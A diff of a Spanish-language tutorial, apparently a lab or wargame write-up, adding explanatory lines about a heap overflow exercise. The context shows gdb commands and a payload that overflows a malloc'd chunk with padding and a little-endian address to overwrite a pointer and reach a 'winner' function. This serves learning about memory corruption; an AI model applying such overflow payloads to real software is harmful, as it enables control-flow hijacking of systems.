@@ -4,6 +4,7 @@
 
 
 Para entender esto es muy importante ver como funciona el [heap](https://github.com/CUCUxii/Informatica/blob/main/Binarios/Estructura%20de%20un%20binario.md#el-heap)
+Abrimos el binario por la parte del heap, analizandolo.
 
 ```console
 (gdb) disas main
@@ -90,5 +91,5 @@ ahí.
 (gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
 and we have a winner @ 1657877687   # echo -ne -> sin salto de linea y formato bytes
 ```
-
+En resumen hemos desbordado el primer del malloc de colocacion de datos para rellenar otro chunk y modificar su puntero hacia donde hemos querido.
 
